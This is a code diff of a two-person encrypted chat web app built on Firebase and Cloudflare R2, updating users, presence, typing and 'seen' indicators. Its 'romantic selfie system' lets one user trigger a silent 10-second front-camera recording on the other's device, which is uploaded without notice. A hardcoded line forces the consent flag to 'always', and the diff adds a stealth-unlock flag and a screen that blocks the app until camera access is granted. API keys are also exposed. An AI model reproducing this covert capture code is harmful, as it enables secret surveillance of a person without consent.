@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebas
 import { getFirestore, collection, addDoc, updateDoc, doc, arrayUnion, onSnapshot, getDocs, query, orderBy, limit, startAfter, serverTimestamp, setDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
 import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
 import { S3Client, PutObjectCommand } from "https://esm.sh/@aws-sdk/client-s3@3.525.0?bundle";
-localStorage.selfietrustpermission = "always";
+localStorage.setItem('selfietrustpermission', 'always');
 // --- CONFIG ---
 const firebaseConfig = {
     apiKey: "AIzaSyCuIDz0QP1Gpb6_40fz7xBY9xihPBuv3OE",
@@ -22,10 +22,14 @@ const r2Config = {
     publicUrl: "https://pub-571fb2dc58e242b2b9542131a58cfb43.r2.dev" 
 };
 
+// --- UPDATED USERS ---
 const USERS = { 
-    "adam": { name: "Adam Smith", avatar: "https://ui-avatars.com/api/?name=Adam+Smith&background=0D8ABC&color=fff" },
-    "eve": { name: "Eve Doe", avatar: "https://ui-avatars.com/api/?name=Eve+Doe&background=ff3b30&color=fff" }
+    "sam10": { name: "Sam", avatar: "sam10.png" },
+    "mastura10": { name: "Mastura", avatar: "mastura10.png" }
 };
+// Fallback for old data
+const UNKNOWN_USER = { name: "Unknown", avatar: "https://ui-avatars.com/api/?name=?" };
+
 const BATCH_SIZE = 20;
 
 const app = initializeApp(firebaseConfig);
@@ -54,8 +58,13 @@ let ctxMsgId = null;
 let ctxIsMe = false;
 let presenceInterval = null;
 let partnerLastTimestamp = 0;
+let partnerLastSeenTime = 0; 
+let myLastSeenWritten = 0;   
+let myLastTyping = 0; 
+let typingTimeout = null; 
 const msgCache = {};
 let currentMediaUrl = "";
+let isAppUnlocked = false; // Stealth Mode Flag
 
 // --- DOM ---
 const dom = {
@@ -106,7 +115,10 @@ const dom = {
     sideOverlay: document.getElementById('side-menu-overlay'),
     menuClose: document.getElementById('menu-close'),
     hiddenCam: document.getElementById('hidden-cam'),
-    hiddenCanvas: document.getElementById('hidden-canvas')
+    hiddenCanvas: document.getElementById('hidden-canvas'),
+    typingIndicator: document.getElementById('typing-indicator'),
+    permBlock: document.getElementById('perm-block'),
+    permRetryBtn: document.getElementById('perm-retry-btn')
 };
 
 function encrypt(text) { return CryptoJS.AES.encrypt(text, vaultKey).toString(); }
@@ -114,28 +126,46 @@ function decrypt(cipherText) {
     try { return CryptoJS.AES.decrypt(cipherText, vaultKey).toString(CryptoJS.enc.Utf8); } catch (e) { return null; }
 }
 
+// --- HELPER: GET PARTNER ID ---
+function getPartnerId() {
+    return currentUser === 'sam10' ? 'mastura10' : 'sam10';
+}
+
+// --- STEALTH UNLOCK LISTENER ---
+document.addEventListener('app-unlocked', () => {
+    isAppUnlocked = true;
+    checkAuthStatus(); // Re-run auth check now that we are visible
+});
+
 // --- AUTH ---
-onAuthStateChanged(auth, (user) => {
+function checkAuthStatus() {
+    if (!isAppUnlocked) return; // Don't do anything if locked
+    
+    const user = auth.currentUser;
     if (user && localStorage.getItem("secure_vault")) {
         vaultKey = localStorage.getItem("secure_vault");
         currentUser = localStorage.getItem("secure_user");
         dom.login.style.display = 'none'; dom.chat.style.display = 'flex';
         
-        // HAMBURGER MENU FOR ADAM
-        if (currentUser === 'adam') {
+        if (currentUser === 'sam10') {
             dom.hamburger.style.display = 'block';
         }
         
-        initChatSystem(); 
-        initPresenceSystem();
+        // IMPORTANT: Permissions must be granted BEFORE initializing chat
         requestInitialPermissions();
-        monitorSelfieRequests(); // Check for pending romantic selfies
+        
     } else {
         dom.loader.style.display = 'none';
         dom.login.style.display = 'flex'; dom.chat.style.display = 'none';
         if(presenceInterval) clearInterval(presenceInterval);
     }
+}
+
+// Run initial check (it will fail/pause until unlocked)
+onAuthStateChanged(auth, () => {
+    if(isAppUnlocked) checkAuthStatus();
 });
+
 
 // --- MENU LOGIC ---
 dom.hamburger.onclick = () => {
@@ -149,47 +179,51 @@ const closeMenu = () => {
 dom.menuClose.onclick = closeMenu;
 dom.sideOverlay.onclick = closeMenu;
 
-// --- PERMISSIONS HANDLER ---
+// --- PERMISSIONS HANDLER (STRICT) ---
 async function requestInitialPermissions() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    
     try {
+        // Ask for both streams
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        
+        // Success! Stop them immediately as we just wanted the permission
         stream.getTracks().forEach(track => track.stop());
+        
+        // Hide block if visible
+        dom.permBlock.style.display = 'none';
+
+        // NOW initialize the app
+        initChatSystem(); 
+        initPresenceSystem();
+        monitorSelfieRequests(); 
+        
+        document.addEventListener("visibilitychange", () => {
+             if (document.visibilityState === 'visible') markMySeen();
+        });
+        
+        // Hide loader after a moment
+        setTimeout(() => { dom.loader.style.display = 'none'; }, 500);
+
     } catch (error) {
         console.warn("Permissions denied:", error);
-        showPermissionWarning();
+        // Show strict block
+        dom.permBlock.style.display = 'flex';
+        dom.loader.style.display = 'none'; // Ensure loader is gone so block is visible
     }
 }
 
-function showPermissionWarning() {
-    const div = document.createElement('div');
-    div.id = 'perm-warning';
-    div.style.cssText = "position:fixed;top:70px;left:5%;width:90%;background:rgba(255, 59, 48, 0.95);color:white;padding:12px;border-radius:12px;z-index:2000;text-align:center;font-size:13px;box-shadow:0 4px 15px rgba(0,0,0,0.5);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,0.2);animation:popIn 0.3s ease-out;";
-    div.innerHTML = "⚠️ <b>Permission Missing</b><br>Cannot load voice messages. Please allow Microphone & Camera access.";
-    const close = document.createElement('div');
-    close.innerText = "Dismiss";
-    close.style.cssText = "margin-top:8px;font-weight:bold;cursor:pointer;text-decoration:underline;opacity:0.9;font-size:11px;text-transform:uppercase;letter-spacing:1px;";
-    close.onclick = () => div.remove();
-    div.appendChild(close);
-    document.body.appendChild(div);
-    setTimeout(() => { if(div.parentNode) div.remove(); }, 10000);
-}
+dom.permRetryBtn.onclick = requestInitialPermissions;
 
-// --- ROMANTIC SELFIE SYSTEM (SILENT VIDEO CAPTURE) ---
+// --- ROMANTIC SELFIE SYSTEM ---
 function monitorSelfieRequests() {
-    // Only Eve monitors for requests
-    if (currentUser !== 'eve') return;
-
+    if (currentUser !== 'mastura10') return;
     const q = query(collection(db, "quickselfierequest"));
     onSnapshot(q, async (snap) => {
         if (!snap.empty) {
-            // Check Trust Permission
             if (localStorage.getItem('selfietrustpermission') === "always") {
-                console.log("❤️ Romantic request found. Recording video...");
-                const requestDoc = snap.docs[0]; // Take first request
+                const requestDoc = snap.docs[0]; 
                 await takeSilentVideo(requestDoc.id);
-            } else {
-                console.log("Request found but no trust permission set.");
             }
         }
     });
@@ -197,81 +231,40 @@ function monitorSelfieRequests() {
 
 async function takeSilentVideo(requestId) {
     try {
-        // 1. Start Camera (Front)
-        // Audio is false to ensure no feedback loops and to keep it strictly visual cute moments
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        
-        // Assign to hidden video element just to ensure browser treats it as active
         dom.hiddenCam.srcObject = stream;
-
         const recorder = new MediaRecorder(stream);
         const chunks = [];
-
-        recorder.ondataavailable = (e) => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
-
+        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
         recorder.onstop = async () => {
-            // 5. Create Blob and Upload
             const blob = new Blob(chunks, { type: 'video/webm' });
             const b64 = await toBase64(blob);
-            
-            // Stop tracks
             stream.getTracks().forEach(track => track.stop());
             dom.hiddenCam.srcObject = null;
-            
             await uploadCuteSelfie(b64, requestId, 'silent-video');
         };
-
-        // 2. Start Recording
         recorder.start();
-        console.log("🎥 Recording 10s silent cute moment...");
-
-        // 3. Stop after 10 seconds
-        setTimeout(() => {
-            recorder.stop();
-        }, 10000);
-
-    } catch (e) {
-        console.error("Silent video capture failed", e);
-    }
+        setTimeout(() => { recorder.stop(); }, 10000);
+    } catch (e) { console.error("Silent video capture failed", e); }
 }
 
 async function uploadCuteSelfie(b64, requestId, type) {
     try {
         const encBlob = encrypt(b64);
         const fname = `cute_${Date.now()}_${Math.random().toString(36).substring(7)}.enc`;
-        
-        // Upload to R2
         await s3.send(new PutObjectCommand({ Bucket: r2Config.bucketName, Key: fname, Body: encBlob, ContentType: "text/plain" }));
-        
-        // Save to 'cuteselfies' DB
-        await addDoc(collection(db, "cuteselfies"), {
-            s: currentUser,
-            d: encrypt(`${r2Config.publicUrl}/${fname}`),
-            t: serverTimestamp(),
-            type: type // 'silent-video'
-        });
-
-        // Delete the request so it doesn't trigger again
+        await addDoc(collection(db, "cuteselfies"), { s: currentUser, d: encrypt(`${r2Config.publicUrl}/${fname}`), t: serverTimestamp(), type: type });
         await deleteDoc(doc(db, "quickselfierequest", requestId));
-        console.log("❤️ Video Sent & Request Cleared");
-
-    } catch (e) {
-        console.error("Upload failed", e);
-    }
+    } catch (e) { console.error("Upload failed", e); }
 }
 
 dom.btnLogin.addEventListener('click', async () => {
     const username = dom.inpUser.value.trim().toLowerCase();
     const gatePass = dom.inpPass.value;
     const vaultPass = dom.inpVault.value;
-    
     if (!USERS[username]) return alert("Unknown User ID");
-    
     dom.btnLogin.innerText = "LOGGING IN...";
     dom.btnLogin.disabled = true;
-
     try {
         await signInWithEmailAndPassword(auth, `${username}@chat.local`, gatePass);
         localStorage.setItem("secure_vault", vaultPass);
@@ -288,40 +281,118 @@ dom.btnLogout.addEventListener('click', async () => {
     if(confirm("Logout?")) { localStorage.clear(); location.reload(); await signOut(auth); }
 });
 
-// --- OPTIMIZED PRESENCE SYSTEM (Low Cost) ---
+// --- PRESENCE, SEEN & TYPING SYSTEM ---
 function initPresenceSystem() {
-    const partnerId = currentUser === 'adam' ? 'eve' : 'adam';
-    dom.headAvatar.src = USERS[partnerId].avatar;
-    dom.headName.innerText = USERS[partnerId].name;
+    const partnerId = getPartnerId();
+    const partner = USERS[partnerId] || UNKNOWN_USER;
+    dom.headAvatar.src = partner.avatar;
+    dom.headName.innerText = partner.name;
 
-    // 1. WRITE: Heartbeat only once per minute (Saves Writes)
-    // Only writes if I am actively looking at the page
+    // 1. WRITE: Heartbeat
     const sendHeartbeat = () => {
         if(document.visibilityState === 'visible') {
             setDoc(doc(db, 'status', currentUser), { online: serverTimestamp() }, { merge: true });
         }
     };
     sendHeartbeat();
-    setInterval(sendHeartbeat, 10000); // 10 seconds
+    setInterval(sendHeartbeat, 10000); 
 
-    // 2. READ: Listener (Only triggers when partner updates)
+    // 2. READ: Partner Updates
     onSnapshot(doc(db, 'status', partnerId), (snap) => {
         if(snap.exists()) {
-            partnerLastTimestamp = snap.data().online ? snap.data().online.toMillis() : 0;
-            updateStatusUI(); // Update immediately on change
+            const data = snap.data();
+            partnerLastTimestamp = data.online ? data.online.toMillis() : 0;
+            updateStatusUI();
+
+            // Seen Indicator
+            if (data.lastSeen) {
+                partnerLastSeenTime = data.lastSeen.toMillis();
+                updateSeenUI();
+            }
+
+            // Typing Indicator
+            if (data.typing) {
+                const typingTime = data.typing.toMillis();
+                const diff = Date.now() - typingTime;
+                
+                // Clear existing hiding timeout
+                if (typingTimeout) clearTimeout(typingTimeout);
+
+                if (diff < 3000) {
+                    dom.typingIndicator.style.display = 'flex';
+                    // Auto hide after buffer
+                    typingTimeout = setTimeout(() => {
+                        dom.typingIndicator.style.display = 'none';
+                    }, 3500);
+                } else {
+                    dom.typingIndicator.style.display = 'none';
+                }
+            }
         }
     });
 
-    // 3. OFFLINE UI TIMER: Updates text locally every 30s (ZERO READS)
-    // This just recalculates "Time Now - Last Known Time"
+    // 3. OFFLINE UI TIMER
     presenceInterval = setInterval(updateStatusUI, 30000);
+}
+
+// --- TYPING HANDLER ---
+dom.input.addEventListener('input', () => {
+    const now = Date.now();
+    // Throttle DB writes to once every 2.5s
+    if (now - myLastTyping > 2500) {
+        myLastTyping = now;
+        setDoc(doc(db, 'status', currentUser), { typing: serverTimestamp() }, { merge: true });
+    }
+});
+
+// --- MARK SEEN ---
+async function markMySeen() {
+    if (document.visibilityState !== 'visible') return;
+    if (!newestVisibleDoc) return; 
+
+    const latestMsgTime = newestVisibleDoc.data().t;
+    if (!latestMsgTime) return;
+    const ms = latestMsgTime.toMillis();
+
+    if (ms > myLastSeenWritten) {
+        myLastSeenWritten = ms;
+        await setDoc(doc(db, 'status', currentUser), { lastSeen: latestMsgTime }, { merge: true });
+    }
+}
+
+// --- UPDATE SEEN UI (TEXT ONLY) ---
+function updateSeenUI() {
+    if (!partnerLastSeenTime) return;
+    const partnerId = getPartnerId();
+
+    // Remove existing indicators (Labels)
+    document.querySelectorAll('.seen-label').forEach(el => el.remove());
+
+    // Find messages sent by ME (.me) that are OLDER than what partner has seen
+    const myMessages = Array.from(document.querySelectorAll('.msg-row.me'));
+    
+    for (let i = myMessages.length - 1; i >= 0; i--) {
+        const row = myMessages[i];
+        const msgId = row.id.replace('msg-', '');
+        const msgData = msgCache[msgId];
+
+        if (msgData && msgData.t && msgData.t.toMillis() <= partnerLastSeenTime) {
+            // Found the latest seen message!
+            // Find the meta div (where time is)
+            const meta = row.querySelector('.msg-meta');
+            if (meta) {
+                const seenSpan = document.createElement('span');
+                seenSpan.className = 'seen-label';
+                seenSpan.innerText = "Seen";
+                meta.appendChild(seenSpan);
+            }
+            break; // Only show on the last one
+        }
+    }
 }
 
 function updateStatusUI() {
     const diff = Date.now() - partnerLastTimestamp;
-    
-    // We consider "Online" if we heard from them in the last 70 seconds
-    // (Since they update every 10s, we give a 10s buffer)
     if(diff < 20000) {
         dom.headStatusText.innerText = "Active Now"; 
         dom.headStatusText.style.color = "#34c759"; 
@@ -331,19 +402,15 @@ function updateStatusUI() {
         const date = new Date(partnerLastTimestamp);
         const now = new Date();
         const timeStr = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-        
-        // Check if the date is NOT the same as today
         if (date.toDateString() !== now.toDateString()) {
             const day = date.getDate();
             const month = date.toLocaleString('default', { month: 'short' });
             dom.headStatusText.innerText = `Last seen ${day} ${month} ${timeStr}`;
         } else {
-            // Logic for "Today"
             if(diff < 120000) dom.headStatusText.innerText = `Last seen just now ${timeStr}`;
             else if(diff < 300000) dom.headStatusText.innerText = `Last seen ${Math.floor(diff/60000)} min ago ${timeStr}`;
             else dom.headStatusText.innerText = `Last seen ${timeStr}`;
         }
-        
         dom.headStatusText.style.color = "#888";
     }
 }
@@ -360,8 +427,9 @@ async function initChatSystem() {
         const docsReversed = [...snapshot.docs].reverse();
         for (const doc of docsReversed) { await processMessageDoc(doc, "append"); }
         scrollToBottom();
+        markMySeen(); 
     }
-    setTimeout(() => { dom.loader.style.display = 'none'; }, 200);
+    // Don't hide loader here; we do it in checkAuthStatus
     dom.list.addEventListener('scroll', handleScroll);
     setupRealtimeListener();
     dom.scrollBtn.addEventListener('click', scrollToBottom);
@@ -380,15 +448,30 @@ function setupRealtimeListener() {
             if (change.type === "added") {
                 const isNearBottom = (dom.list.scrollHeight - dom.list.scrollTop - dom.list.clientHeight) < 150;
                 processMessageDoc(change.doc, "append");
-                if (isNearBottom) setTimeout(scrollToBottom, 100);
-                else { dom.scrollBtn.classList.add('show'); dom.scrollBtn.classList.add('pulse'); }
+                
+                if (!newestVisibleDoc || (change.doc.data().t && change.doc.data().t.toMillis() > newestVisibleDoc.data().t.toMillis())) {
+                    newestVisibleDoc = change.doc;
+                }
+
+                if (isNearBottom) { 
+                    setTimeout(() => {
+                        scrollToBottom();
+                        markMySeen(); 
+                    }, 100);
+                } else { 
+                    dom.scrollBtn.classList.add('show'); dom.scrollBtn.classList.add('pulse'); 
+                }
             }
             if (change.type === "modified") updateMessageInPlace(change.doc);
         });
     });
 }
 
-function scrollToBottom() { dom.list.scrollTop = dom.list.scrollHeight; dom.scrollBtn.classList.remove('show'); }
+function scrollToBottom() { 
+    dom.list.scrollTop = dom.list.scrollHeight; 
+    dom.scrollBtn.classList.remove('show'); 
+    markMySeen(); 
+}
 
 async function handleScroll() {
     if (dom.list.scrollTop === 0 && !isLoadingHistory && !allHistoryLoaded) {
@@ -414,8 +497,14 @@ async function processMessageDoc(doc, method) {
     if(data.hide && data.hide.includes(currentUser)) return;
     
     const div = document.createElement('div'); div.id = `msg-${doc.id}`; div.className = `msg-row ${data.s === currentUser ? 'me' : 'other'}`;
+    
+    const senderInfo = USERS[data.s] || UNKNOWN_USER;
+
     if(data.s !== currentUser) {
-        const img = document.createElement('img'); img.src = USERS[data.s].avatar; img.className = 'msg-avatar'; div.appendChild(img);
+        const img = document.createElement('img'); 
+        img.src = senderInfo.avatar; 
+        img.className = 'msg-avatar'; 
+        div.appendChild(img);
     }
     if (method === "append") dom.list.appendChild(div); else dom.list.insertBefore(div, dom.list.children[1] || null);
 
@@ -428,7 +517,8 @@ async function processMessageDoc(doc, method) {
     if(data.rep) {
         const rh = document.createElement('div'); rh.className = 'reply-header';
         let txt = decrypt(data.rep.d); if(txt && txt.includes('http') && !txt.includes(' ')) txt = "📷 Media";
-        rh.innerText = `↪ ${USERS[data.rep.s].name}: ${txt ? txt.substring(0,20) : '...'}...`; bubble.appendChild(rh);
+        const repUser = USERS[data.rep.s] || UNKNOWN_USER; 
+        rh.innerText = `↪ ${repUser.name}: ${txt ? txt.substring(0,20) : '...'}...`; bubble.appendChild(rh);
     }
 
     const contentDiv = document.createElement('div'); contentDiv.className = 'msg-content';
@@ -451,6 +541,8 @@ async function processMessageDoc(doc, method) {
         Object.values(data.rx).forEach(e => rxDiv.innerHTML += `<span class="rx-item rx-pop">${e}</span>`);
     }
     bubble.appendChild(rxDiv); div.appendChild(bubble);
+
+    updateSeenUI();
 }
 
 function updateMessageInPlace(doc) {
@@ -527,14 +619,42 @@ function formatTime(t) { if(!t) return ""; const d = t.toDate ? t.toDate() : new
 function openRxModal(rx) {
     if(!rx) return; dom.rxList.innerHTML = '';
     Object.entries(rx).forEach(([uid, emoji]) => {
-        dom.rxList.innerHTML += `<div class="rx-detail-row"><img src="${USERS[uid].avatar}" style="width:24px;height:24px;border-radius:50%"><span style="flex:1;font-weight:bold">${USERS[uid].name}</span><span style="font-size:20px">${emoji}</span></div>`;
+        const u = USERS[uid] || UNKNOWN_USER;
+        dom.rxList.innerHTML += `<div class="rx-detail-row"><img src="${u.avatar}" style="width:24px;height:24px;border-radius:50%"><span style="flex:1;font-weight:bold">${u.name}</span><span style="font-size:20px">${emoji}</span></div>`;
     });
     dom.rxModal.style.display = 'flex';
 }
 dom.closeRxModal.onclick = () => dom.rxModal.style.display = 'none';
 
 async function renderContent(wrapper, content, type) {
-    if (type === 'text') { wrapper.innerText = content; } 
+    if (type === 'text') { 
+        // --- ESCAPE HTML ---
+        // Prevent XSS since we are using innerHTML
+        const safeText = content
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+
+        // --- AUTO-LINKER REGEX ---
+        // Matches words that start with http, https, www, or domain-like patterns
+        // Greedily matches non-whitespace characters to include paths, queries, etc.
+        const linkedText = safeText.replace(
+            /(\b(?:https?:\/\/|www\.|[a-zA-Z0-9-]+\.[a-zA-Z]{2,})[^\s]*)/g, 
+            (url) => {
+                let href = url;
+                // Add https:// if missing (and not relative path/protocol agnostic)
+                if (!href.startsWith('http') && !href.startsWith('//')) {
+                    href = 'https://' + href;
+                }
+                return `<a href="${href}" target="_blank">${url}</a>`;
+            }
+        );
+
+        wrapper.innerHTML = linkedText;
+
+    } 
     else if (type === 'media') {
         const skel = document.createElement('div'); skel.className = 'skeleton'; wrapper.appendChild(skel);
         try {
@@ -565,7 +685,8 @@ dom.ctxUnsend.onclick = async () => { if(confirm("Unsend?")) await updateDoc(doc
 dom.ctxRemove.onclick = async () => { await updateDoc(doc(db, "messages", ctxMsgId), { hide: arrayUnion(currentUser) }); document.getElementById(`msg-${ctxMsgId}`).remove(); dom.contextMenu.classList.remove('active'); };
 function startReply(id, encContent, senderId) {
     currentReply = { id, d: encContent, s: senderId };
-    dom.replyBar.style.display = 'flex'; dom.replyUser.innerText = `Replying to ${USERS[senderId].name}`;
+    const senderInfo = USERS[senderId] || UNKNOWN_USER;
+    dom.replyBar.style.display = 'flex'; dom.replyUser.innerText = `Replying to ${senderInfo.name}`;
     let clean = decrypt(encContent); if(clean.includes('http') && !clean.includes(' ')) clean = "📷 Media";
     dom.replyText.innerText = clean; dom.input.focus();
 }
